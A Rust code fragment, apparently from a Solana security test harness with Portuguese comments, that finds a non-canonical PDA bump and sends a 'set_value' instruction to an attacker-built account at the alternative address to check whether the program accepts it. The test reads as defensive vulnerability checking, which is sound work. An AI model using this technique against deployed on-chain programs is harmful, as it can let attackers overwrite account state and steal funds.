let mut non_canonical_bump: Option<u8> = None;
let mut non_canonical_pda: Option<Pubkey> = None;
for b in (0..canonical_bump).rev() {
    if let Ok(addr) = Pubkey::create_program_address(&[key.to_le_bytes().as_ref(), &[b]], &env.program_id) {
        non_canonical_bump = Some(b);
        non_canonical_pda = Some(addr);
        break;
    }
}

if let (Some(bump_alt), Some(pda_alt)) = (non_canonical_bump, non_canonical_pda) {
    // Conta Data no endereco alternativo, controlada pelo atacante (mesmo dono do programa para passar Account<Data>)
    let data_alt = account(&env.program_id, &anchor_account_data("Data", &(0u64,)), None);

    let ix_attack = env.anchor_ix("set_value", &(key, new_value, bump_alt), vec![
        AccountMeta::new(pda_alt, false),
    ]);
    let contas_attack = vec![
        (pda_alt, data_alt),
    ];

    let r_attack = env.attack("set_value com bump nao canonico", &ix_attack, &contas_attack);

    if r_attack.program_result == ProgramResult::Success {
        // Verifica que o value da conta alternativa foi alterado
        let data_after = after(&r_attack, &pda_alt);
        env.effect("value da conta no PDA nao canonico foi alterado", read_u64(data_after.data(), 8) == new_value);
    }
}"
